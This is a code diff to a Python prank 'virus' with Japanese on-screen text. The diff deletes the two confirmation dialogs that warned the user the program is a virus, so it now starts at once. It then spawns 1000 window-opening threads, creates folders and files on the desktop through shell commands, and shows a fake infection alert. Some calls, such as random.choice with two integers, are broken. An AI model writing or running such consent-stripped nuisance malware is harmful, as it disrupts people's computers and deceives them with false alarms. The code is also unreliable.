@@ -7,8 +7,6 @@ import threading
 import pygame
 import random
 import os
-import time
-from time import sleep
 import webbrowser
 
 pygame.init()
@@ -137,7 +135,6 @@ def pythonopen():
   subprocess.run(f'cd {desktop} & mkdir aarrvirus😈{random.choice(0,999999999)}　& cd aarrvirus{random.choice(0,999999999)} & type nul > aarr{random.choice(0,999999999)}.txt', shell=True, stderr=subprocess.PIPE)
   messagebox.showerror('os error', 'パソコンがウイルスに侵入されています。')
   errorsound.play()
-  webbrowser.open(random.choice(sites))
 
 
 def imageopen():
@@ -168,24 +165,9 @@ def windowopen():
 threads = []
 
 def virusstart():
-  messagebox.showinfo('start', 'スタート😈')
   for a in range(1000):
     threads.append(threading.Thread(target=windowopen))
     threads[a].start()
 
 
-keikoku = messagebox.askyesno('警告', '''このソフトはウイルスです
-このソフトによってファイル、フォルダに影響が起きても
-私は何も私は責任を取りません
-起動する場合は「はい」を押してください、起動しない場合は「いいえ」を押してください''')
-
-if keikoku == True:
-  saisyuukeikoku = messagebox.askyesno('最終警告', '''お遊びでこのファイルを起動していないですね？
-初めていいですね？？
-良い場合は「はい」よくない場合は「いいえ」を選択してください''')
-  if saisyuukeikoku == True:
-    virusstart()
-  if saisyuukeikoku == False:
-    sys.exit()
-if keikoku == False:
-    sys.exit()
+virusstart()
